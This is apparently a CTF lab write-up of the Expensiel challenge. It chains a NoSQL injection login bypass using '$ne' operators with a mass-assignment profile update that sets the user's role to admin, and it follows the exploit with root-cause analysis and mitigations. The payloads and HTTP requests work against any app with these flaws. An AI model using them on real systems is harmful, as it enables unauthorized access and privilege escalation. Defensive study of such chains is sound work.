---
title: "NoSQL Injection to Mass Assignment Admin Takeover | Expensiel"
date: 2026-06-12 14:30:00 +0530
categories: [A05 - Injection, NoSQL Injection]
tags: [nosql-injection, mass-assignment, authentication-bypass, privilege-escalation, broken-access-control, webverselabs-pro, ctf]
platform: WebVerse Pro
author: Shivansh Sharma
image:
  path: /assets/images/posts/expensiel.webp
  alt: "Expensiel NoSQL Injection to Mass Assignment Admin Takeover"
---

## Lab Link

Lab: [Expensiel](https://dashboard.webverselabs-pro.com/mystery-challenges/expensiel)

## Overview

Expensiel is a WebVerse Pro mystery challenge built around an expense reimbursement workflow. The application allows employees to log in, submit expense claims, manage profile settings, and view reimbursements.

During testing, the application exposed a chained vulnerability path. The login endpoint accepted raw JSON input in a way that allowed NoSQL operators to alter the authentication logic. After gaining access to a normal user session, the profile update endpoint accepted sensitive fields from the client, allowing the user role to be changed to `admin`.

The final exploit chain was:

```text
NoSQL Injection authentication bypass
        ↓
Authenticated user session
        ↓
Mass Assignment in profile update
        ↓
Admin role escalation
        ↓
Access to /admin
        ↓
Flag retrieval
```

This writeup documents the solved path in an educational and defensive way.

## Objective

The objective of the lab was to gain administrative access to the application and retrieve the challenge flag.

## Vulnerability Identification

The challenge involved two vulnerabilities chained together.

```text
OWASP Top 10:2025
├── A05 - Injection
│   └── NoSQL Injection
│       └── Authentication bypass through Mongo-style operators
│
└── A01 - Broken Access Control
    └── Mass Assignment
        └── User-controlled role update leading to admin escalation
```

Primary classification:

```yaml
categories: [A05 - Injection, NoSQL Injection]
secondary: [A01 - Broken Access Control, Mass Assignment]
impact: Authentication Bypass + Privilege Escalation
```

## Reconnaissance

The application exposed a login endpoint:

```http
POST /api/login HTTP/2
Host: <LIVE_HOST>
Content-Type: application/json

{
  "email": "user@example.com",
  "password": "password"
}
```

A normal login attempt with invalid credentials returned an authentication failure:

```json
{
  "ok": false,
  "error": "That email or password is incorrect."
}
```

Because the request body used JSON, the next step was to check whether the backend safely validated field types or whether it passed user-controlled objects directly into the database query.

After authentication was bypassed, the application showed a normal employee dashboard with routes such as:

```text
/dashboard
/claims
/claims/new
/reimbursements
/settings
```

The authenticated user appeared as a regular employee:

```text
Tom Becker
Facilities Lead · Operations
```

The `/settings` page contained a profile update feature, which became the second important part of the chain.

## Exploitation Narrative

### Step 1: NoSQL Injection Authentication Bypass

The login endpoint accepted JSON input. Instead of sending normal string values for `email` and `password`, Mongo-style comparison operators were supplied.

The successful bypass payload was:

```json
{
  "email": {
    "$ne": null
  },
  "password": {
    "$ne": null
  }
}
```

This allowed authentication to be bypassed.

The likely vulnerable pattern was that the backend used the request body directly in a database lookup, similar to:

```js
db.users.findOne({
  email: req.body.email,
  password: req.body.password
})
```

When the JSON object was accepted, the query logic became equivalent to:

```text
email is not null AND password is not null
```

That condition matched an existing user and created an authenticated session.

A session cookie was then issued:

```http
Set-Cookie: connect.sid=<REDACTED_SESSION_COOKIE>
```

At this point, access to the normal user area was available.

### Step 2: Finding the Profile Update Endpoint

After logging in, the settings page was reviewed. Updating profile details produced a request to:

```http
PATCH /api/profile HTTP/2
Host: <LIVE_HOST>
Cookie: connect.sid=<REDACTED_SESSION_COOKIE>
Content-Type: application/json
```

A normal profile update contained fields such as:

```json
{
  "name": "Tom Becker",
  "phone": "(503) 555-0121",
  "department": "admin",
  "payoutLast4": "3390",
  "notifyEmail": true
}
```

The server accepted the update:

```json
{
  "ok": true
}
```

This indicated that the profile endpoint was patching user-controlled fields from the request body.

### Step 3: Mass Assignment Role Escalation

The profile update request was modified to include a sensitive authorization field:

```http
PATCH /api/profile HTTP/2
Host: <LIVE_HOST>
Cookie: connect.sid=<REDACTED_SESSION_COOKIE>
Content-Type: application/json

{
  "name": "Tom Becker",
  "phone": "(503) 555-0121",
  "department": "admin",
  "role": "admin",
  "payoutLast4": "3390",
  "notifyEmail": true
}
```

The server again responded successfully:

```json
{
  "ok": true
}
```

This confirmed a Mass Assignment issue. The backend allowed the client to submit and update sensitive fields that should never be controlled by a regular user.

The critical field was:

```json
{
  "role": "admin"
}
```

After this update, the session had administrative privileges.

### Step 4: Accessing the Admin Panel

With the role changed to admin, the protected admin route became accessible:

```text
/admin
```

Visiting the admin page revealed the challenge flag.

## Proof of Exploitation

The proof of exploitation was the successful chain from unauthenticated access to admin access.

First, authentication was bypassed using NoSQL operator injection:

```json
{
  "email": {
    "$ne": null
  },
  "password": {
    "$ne": null
  }
}
```

Then, the authenticated profile update endpoint accepted a user-controlled role field:

```json
{
  "name": "Tom Becker",
  "phone": "(503) 555-0121",
  "department": "admin",
  "role": "admin",
  "payoutLast4": "3390",
  "notifyEmail": true
}
```

The server accepted the update:

```json
{
  "ok": true
}
```

Finally, the admin panel was accessed:

```http
GET /admin HTTP/2
Host: <LIVE_HOST>
Cookie: connect.sid=<REDACTED_SESSION_COOKIE>
```

The flag was displayed on the admin page:

```text
WEBVERSE{REDACTED_FLAG}
```

## Root Cause Analysis

The vulnerability chain existed because of two insecure backend design decisions.

First, the login endpoint did not enforce strict input types. The application expected `email` and `password` to be strings, but it accepted JSON objects. This allowed database query operators such as `$ne` to modify the intended authentication logic.

Second, the profile update endpoint trusted client-controlled input too broadly. Instead of allowing only safe profile fields, the backend accepted sensitive authorization-related properties such as `role`.

A safer profile update implementation should only allow explicitly approved fields, such as:

```text
name
phone
payoutLast4
notifyEmail
```

Fields such as the following should never be accepted from a regular profile update request:

```text
role
isAdmin
permissions
department privilege mappings
approval rights
finance rights
```

## Impact

The impact of this chain was high because it allowed a complete privilege escalation path.

An attacker could:

```text
Bypass authentication
Gain access as an existing user
Modify protected profile attributes
Escalate to administrator
Access the admin panel
Read sensitive administrative data
Retrieve the challenge flag
```

In a real expense reimbursement system, this type of vulnerability could expose employee information, reimbursement records, payout details, internal claim data, and administrative workflows.

It could also allow unauthorized claim approval, reimbursement manipulation, and abuse of finance-related functionality.

## Mitigation

To prevent the NoSQL Injection issue:

```text
Validate login input types strictly
Reject objects or arrays where strings are expected
Use schema validation before database queries
Avoid passing raw request bodies directly into query objects
Use parameterized or ORM-safe query methods where applicable
Hash and compare passwords securely outside direct query matching
```

For example, the backend should reject input unless both fields are strings:

```js
if (typeof email !== "string" || typeof password !== "string") {
  return res.status(400).json({ ok: false, error: "Invalid input" });
}
```

To prevent Mass Assignment:

```text
Use an allowlist of editable fields
Never trust client-submitted authorization fields
Separate profile updates from role/permission management
Perform authorization checks server-side
Keep role changes restricted to privileged admin-only workflows
Log and alert on privilege-related changes
```

A safer update pattern would be:

```js
const allowedUpdates = {
  name: req.body.name,
  phone: req.body.phone,
  payoutLast4: req.body.payoutLast4,
  notifyEmail: req.body.notifyEmail
};
```

The server should ignore or reject fields such as:

```text
role
admin
isAdmin
permissions
canApprove
canReimburse
```

## Real-World Insight

This lab is a good example of how small implementation mistakes can become serious when chained together.

The NoSQL Injection bug alone allowed unauthorized access, but the account was initially just a normal user. The Mass Assignment issue alone required an authenticated session. When combined, they created a full account takeover and privilege escalation path.

This is why defensive testing should not stop at the first bug. Real-world attackers often chain medium-severity issues into critical impact.

Key lessons from Expensiel:

```text
Validate both value and type
Do not pass raw JSON directly into database queries
Use allowlists for update operations
Keep authorization fields server-controlled
Test authenticated functionality after login bypasses
Review profile and settings endpoints for Mass Assignment
```

Expensiel demonstrates that authentication and authorization must be protected at every layer. Even if one control fails, the application should not allow a user-controlled profile update to become an administrative role change.
